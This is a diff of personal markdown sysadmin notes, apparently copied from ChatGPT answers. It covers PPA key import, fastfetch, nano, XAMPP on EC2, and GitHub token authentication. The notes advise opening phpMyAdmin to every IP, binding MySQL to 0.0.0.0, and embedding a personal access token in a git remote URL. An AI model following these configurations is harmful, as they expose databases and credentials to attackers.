 https://launchpad.net/~zhangsongcui3371/+archive/ubuntu/fastfetch
 2. Find the GPG Key Information on the PPA Page
@@ -754,29 +856,33 @@ This will add the PPA's GPG key to your system so that the system can verify and
 Let me know if you need help locating the key!
 
 
+```
 
 
 
+## ERROR APT-KEY
 
-You said:
 sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys eb65ee19d802f3eb1a13cfe47e2e5cb4d4865f21
+
 Warning: apt-key is deprecated. Manage keyring files in trusted.gpg.d instead (see apt-key(8)).
+
 Executing: /tmp/apt-key-gpghome.wjDDkiJ7qN/gpg.1.sh --keyserver keyserver.ubuntu.com --recv-keys eb65ee19d802f3eb1a13cfe47e2e5cb4d4865f21
+
 gpg: keyserver receive failed: Server indicated a failure
-ChatGPT said:
-ChatGPT
+
 The warning you're seeing indicates that apt-key is deprecated, and the error message suggests that there is an issue connecting to the keyserver.
 
-Alternatives to Using apt-key (Recommended Approach)
-Instead of using apt-key, it's recommended to manage keys directly in the /etc/apt/trusted.gpg.d/ directory.
+## Alternatives to Using apt-key (Recommended Approach)
 
-You can do the following:
+* Instead of using apt-key, it's recommended to manage keys directly in the /etc/apt/trusted.gpg.d/ directory.
 
-Download the Key Manually:
+> You can do the following:
 
-If the keyserver fails to respond, you can try downloading the key directly from the Launchpad page or its link. To do this:
+**Download the Key Manually:**
 
-bash
+*If the keyserver fails to respond, you can try downloading the key directly from the Launchpad page or its link. To do this:*
+
+```bash
 Copy code
 wget -qO - https://keyserver.ubuntu.com/pks/lookup?op=get&search=0xEB65EE19D802F3EB1A13CFE47E2E5CB4D4865F21 | sudo tee /etc/apt/trusted.gpg.d/fastfetch.asc
 Verify and Add the Key:
@@ -790,37 +896,43 @@ After adding the key manually, you can update the package list:
 bash
 Copy code
 sudo apt update
-Alternative Keyservers
+```
+
+## Alternative Keyservers
 If you're still facing issues with the keyserver.ubuntu.com connection, try using a different keyserver:
 
-bash
+```bash
 Copy code
 sudo apt-key adv --keyserver hkps://keyserver.ubuntu.com:443 --recv-keys EB65EE19D802F3EB1A13CFE47E2E5CB4D4865F21
 Or:
+```
 
-bash
+```bash
 Copy code
 sudo apt-key adv --keyserver hkps://pgp.mit.edu --recv-keys EB65EE19D802F3EB1A13CFE47E2E5CB4D4865F21
 Why This Happens
 Sometimes the default keyserver may experience downtime or other connectivity issues. Using alternate keyservers or manually downloading the key ensures that you can still proceed with adding repositories and installing packages.
+```
 
-Let me know if any issues persist!
-installing fastfetch
+## installing fastfetch FROM GITHUB
 https://github.com/fastfetch-cli/fastfetch/releases/tag/2.24.0
 
-#set nano ctrl o to savefile main
+
+## set nano ctrl o to savefile main
 
 By default, Nano in Linux already uses Ctrl + O (Control + O) as the key combination to save (write out) the current file. If this functionality is missing or you want to ensure it's properly set, here's how you can configure it:
 
 1. Ensure the Keybinding Is Active
+
 In Nano, the keybinding for "WriteOut" (saving the file) is Ctrl + O by default. To ensure that this behavior is not changed, check the configuration files for Nano.
 
 2. Modify Nano's Configuration File
+
 You can create or modify Nano's configuration file (nanorc) to ensure Ctrl + O works as the save shortcut.
 
-Open the Nano configuration file:
+>Open the Nano configuration file:
 
-bash
+```bash
 Copy code
 nano ~/.nanorc
 If you don't see the following line, add it to ensure Ctrl + O is used for saving (though it should be set by default):
@@ -828,32 +940,47 @@ If you don't see the following line, add it to ensure Ctrl + O is used for savin
 bash
 Copy code
 bind ^O savefile main
+```
 
-##1. Install XAMPP on EC2
+
+## Install XAMPP on EC2
+```
 ssh -i /path/to/your-key.pem ubuntu@your-ec2-public-ip
 wget https://www.apachefriends.org/xampp-files/7.4.30/xampp-linux-x64-7.4.30-0-installer.run
 chmod +x xampp-linux-x64-7.4.30-0-installer.run
 sudo ./xampp-linux-x64-7.4.30-0-installer.run
-sudo ./xampp-linux-x64-7.4.30-0-installer.run
 sudo /opt/lampp/lampp start
 http://your-ec2-public-ip
+```
+
 2. Configure Security Group for XAMPP Ports
+
 To access phpMyAdmin and other services, you need to allow the following ports in the EC2 instance's Security Group:
 
 Port 80 (HTTP): For accessing the web interface.
+
 Port 3306 (MySQL): If you need remote access to MySQL (optional).
+
 Steps:
 
+
 Open your EC2 Dashboard.
+
 Select your EC2 instance, and under the Security tab, click the associated Security Group.
+
 Edit the Inbound Rules:
+
 Allow HTTP (Port 80) from anywhere (0.0.0.0/0 and ::/0 for IPv6).
+
 Allow MySQL/Aurora (Port 3306) if you plan to access MySQL remotely (optional).
+
 3. Access phpMyAdmin via Web Interface
+
 Allow phpMyAdmin from all IPs (since XAMPP restricts access to localhost by default):
 
 Open the phpMyAdmin configuration file:
-bash
+
+```bash
 Copy code
 sudo nano /opt/lampp/etc/extra/httpd-xampp.conf
 Find the block for phpMyAdmin (usually under Alias /phpmyadmin "/opt/lampp/phpmyadmin"), and change Require local to Require all granted, so it looks like this:
@@ -865,8 +992,8 @@ Copy code
     ErrorDocument 403 /error/XAMPP_FORBIDDEN.html.var
 </Directory>
 Restart XAMPP: After editing, restart XAMPP to apply the changes:
-
-bash
+```
+```bash
 Copy code
 sudo /opt/lampp/lampp restart
 Access phpMyAdmin: Now you can access phpMyAdmin through your browser:
@@ -874,14 +1001,20 @@ Access phpMyAdmin: Now you can access phpMyAdmin through your browser:
 bash
 Copy code
 http://your-ec2-public-ip/phpmyadmin
+```
+
 4. Secure phpMyAdmin
+
 By opening phpMyAdmin to all IPs, it becomes publicly accessible, which can be a security risk. Here are ways to mitigate this:
 
 IP Restriction:
 
 In httpd-xampp.conf, instead of Require all granted, restrict access to your own IP address:
+
 apache
-Copy code
+
+```Copy code
+
 Require ip your-ip-address
 Password Protection:
 
@@ -889,13 +1022,17 @@ You can add basic HTTP authentication for further security.
 Disable phpMyAdmin When Not in Use:
 
 You can restrict access by editing the Apache config and commenting out the phpMyAdmin alias block or using firewall rules to block access.
+```
+
 5. Access MySQL Remotely (Optional)
+
 If you need to access MySQL from outside the EC2 instance (e.g., from a local MySQL client):
 
 Allow remote access in MySQL:
 
 Open the MySQL config file:
-bash
+
+```bash
 Copy code
 sudo nano /opt/lampp/etc/my.cnf
 Find the bind-address line and change it from 127.0.0.1 to 0.0.0.0:
@@ -918,19 +1055,30 @@ Restart MySQL:
 bash
 Copy code
 sudo /opt/lampp/lampp restart
+```
+
 2. Configure Security Group for XAMPP Ports
+
 To access phpMyAdmin and other services, you need to allow the following ports in the EC2 instance's Security Group:
 
 Port 80 (HTTP): For accessing the web interface.
+
 Port 3306 (MySQL): If you need remote access to MySQL (optional).
+
 Steps:
 
 Open your EC2 Dashboard.
+
 Select your EC2 instance, and under the Security tab, click the associated Security Group.
+
 Edit the Inbound Rules:
+
 Allow HTTP (Port 80) from anywhere (0.0.0.0/0 and ::/0 for IPv6).
+
 Allow MySQL/Aurora (Port 3306) if you plan to access MySQL remotely (optional).
+
 3. Access phpMyAdmin via Web Interface
+
 Allow phpMyAdmin from all IPs (since XAMPP restricts access to localhost by default):
 
 Open the phpMyAdmin configuration file:
@@ -3531,7 +3679,7 @@ Update the Remote URL:
 Use the token in place of your password:
 bash
 Copy code
-
+git remote set-url origin https://<YOUR_GITHUB_USERNAME>:<YOUR_PERSONAL_ACCESS_TOKEN>@github.com/lilplucky/cats.git
 Push or Pull with your Token:
 
 Now, when you git pull or git push, it will use the token instead of a password:
